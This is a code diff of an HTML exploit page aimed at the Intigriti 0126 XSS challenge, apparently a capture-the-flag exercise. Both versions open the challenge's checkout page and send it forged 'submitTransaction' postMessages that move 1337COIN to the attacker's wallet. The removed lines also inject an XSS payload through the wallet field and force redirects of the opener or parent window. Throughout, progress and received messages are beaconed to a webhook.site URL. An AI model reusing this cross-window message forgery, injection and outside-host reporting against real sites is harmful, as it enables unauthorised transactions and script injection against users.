@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - XSS Exploit</title>
+    <title>Intigriti 0126 - Debug Exploit</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}a{color:#00ff00;text-decoration:underline;}</style>
+    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
 </head>
 <body>
-    <h1>EXPLOIT LOADED</h1>
-    <div id="log">Starting...</div>
+    <h1>DEBUG EXPLOIT</h1>
+    <div id="log">Starting debug...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/b811ce8f-84f1-46df-8ad6-96f9c3e9ca1f';
+        const WEBHOOK = 'https://webhook.site/2dab0d49-91b3-44a1-917f-c4332d3d3814';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
         const CURRENCY = '1337COIN';
-        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
 
         function log(msg) {
             document.getElementById('log').innerHTML += '<br>' + msg;
@@ -28,134 +27,115 @@
 
         track('start', 'loaded', {});
 
-        let popup = null;
-        let attemptCount = 0;
-        const MAX_ATTEMPTS = 20;
+        // Try different methods and report which one works
+        const methods = [];
 
-        function sendTransactions(targetWindow) {
-            log('Sending transactions NOW...');
-            track('sending_tx', 'start', { window: !!targetWindow });
-
-            try {
-                targetWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: CURRENCY,
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx1_sent', 'success', {});
-                log('TX #1 sent');
-
-                targetWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: XSS_WALLET,
-                        currency: CURRENCY,
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx2_sent', 'success', {});
-                log('TX #2 sent with XSS');
-            } catch (e) {
-                log('Error: ' + e.message);
-                track('send_error', 'failed', { error: e.message });
-            }
-        }
-
-        function checkPopupReady() {
-            attemptCount++;
-            track('check_attempt', 'checking', { attempt: attemptCount });
-
-            if (!popup || popup.closed) {
-                log('Popup was closed or blocked!');
-                track('popup_closed', 'failed', { attempt: attemptCount });
-                return;
-            }
-
-            // Try to send messages every second
-            if (attemptCount >= 5) {
-                log('Sending transaction messages...');
-                sendTransactions(popup);
-            }
-
-            if (attemptCount < MAX_ATTEMPTS) {
-                setTimeout(checkPopupReady, 1000);
-            } else {
-                log('Max attempts reached');
-                track('max_attempts', 'done', {});
-            }
-        }
-
-        // Also try window.opener method
+        // Method 1: Check for window.opener
         if (window.opener && !window.opener.closed) {
-            log('Found window.opener - redirecting...');
+            log('[METHOD 1] Found window.opener');
             track('opener_found', 'success', {});
-
-            window.opener.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
-
-            setTimeout(() => {
-                log('Sending via window.opener...');
-                sendTransactions(window.opener);
-            }, 8000);
-
-            // Still try popup as backup
-            popup = window.open(`${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`, 'checkout', 'width=1000,height=800');
-            if (popup) {
-                track('popup_opened', 'success', {});
-                setTimeout(checkPopupReady, 3000);
-            }
+            methods.push('opener');
         }
-        // Try window.parent
-        else if (window.parent && window.parent !== window) {
-            log('Found window.parent - redirecting...');
+
+        // Method 2: Check for window.parent
+        if (window.parent && window.parent !== window) {
+            log('[METHOD 2] Found window.parent');
             track('parent_found', 'success', {});
-
-            window.parent.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
-
-            setTimeout(() => {
-                log('Sending via window.parent...');
-                sendTransactions(window.parent);
-            }, 8000);
-        }
-        // Use popup
-        else {
-            log('Trying popup approach...');
-            track('popup_attempt', 'start', {});
-
-            popup = window.open(
-                `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
-                'checkout',
-                'width=1000,height=800,scrollbars=yes'
-            );
-
-            if (popup) {
-                log('Popup opened!');
-                track('popup_opened', 'success', {});
-                setTimeout(checkPopupReady, 3000);
-            } else {
-                log('Popup blocked - trying fallback');
-                track('popup_blocked', 'trying_fallback', {});
-
-                // Fallback: use a link that auto-clicks
-                document.body.innerHTML += '<br><a id="link" href="' + `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000` + '" target="_blank" rel="opener">Open Checkout</a>';
-
-                setTimeout(() => {
-                    document.getElementById('link').click();
-                    track('link_clicked', 'done', {});
-                    log('Link clicked');
-                }, 1000);
-            }
+            methods.push('parent');
         }
 
-        // Listen for responses
+        // Method 3: Try popup
+        log('[METHOD 3] Trying popup...');
+        const popup = window.open(
+            `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
+            'checkout',
+            'width=1000,height=800'
+        );
+
+        if (popup) {
+            log('[SUCCESS] Popup opened!');
+            track('popup_opened', 'success', {});
+            methods.push('popup');
+
+            // Poll popup status
+            let checks = 0;
+            const pollPopup = setInterval(() => {
+                checks++;
+                try {
+                    // Try to get popup location
+                    const popupLoc = popup.location.href;
+                    track('popup_status', 'ok', {
+                        url: popupLoc.substring(0, 50),
+                        check: checks
+                    });
+                    log(`Check ${checks}: ${popupLoc.substring(0, 50)}...`);
+
+                    // If still on checkout after 5 seconds, try sending
+                    if (checks >= 5 && popupLoc.includes('checkout')) {
+                        log('Popup is on checkout - SENDING postMessage...');
+                        track('sending_to_popup', 'start', {});
+
+                        popup.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                toAddress: YOUR_WALLET,
+                                currency: CURRENCY,
+                                amount: 1337
+                            }
+                        }, '*');
+
+                        track('tx_sent', 'done', { method: 'popup' });
+                        log('postMessage sent to popup!');
+                        clearInterval(pollPopup);
+                    }
+                } catch(e) {
+                    // Cross-origin - can't read location
+                    track('popup_cross_origin', 'expected', { check: checks });
+
+                    if (checks >= 8) {
+                        log('Popup should be loaded - SENDING postMessage...');
+                        track('sending_blind', 'start', { check: checks });
+
+                        popup.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                toAddress: YOUR_WALLET,
+                                currency: CURRENCY,
+                                amount: 1337
+                            }
+                        }, '*');
+
+                        track('tx_sent_blind', 'done', {});
+                        log('postMessage sent (blind)!');
+                        clearInterval(pollPopup);
+                    }
+                }
+
+                if (checks >= 15) {
+                    clearInterval(pollPopup);
+                    track('poll_timeout', 'done', { checks });
+                }
+            }, 1000);
+        } else {
+            log('[FAILED] Popup blocked!');
+            track('popup_blocked', 'failed', {});
+        }
+
+        // Listen for ANY messages
         window.addEventListener('message', (event) => {
-            log('Got message: ' + JSON.stringify(event.data).substring(0, 100));
-            track('got_message', 'info', event.data);
+            log(`[RECEIVED MESSAGE] ${JSON.stringify(event.data).substring(0, 100)}`);
+            track('msg_received', 'info', {
+                data: JSON.stringify(event.data).substring(0, 200),
+                origin: event.origin
+            });
         });
+
+        // Summary after 15 seconds
+        setTimeout(() => {
+            log('=== DEBUG SUMMARY ===');
+            log(`Methods available: ${methods.join(', ') || 'none'}`);
+            track('summary', 'done', { methods });
+        }, 15000);
     </script>
 </body>
 </html>
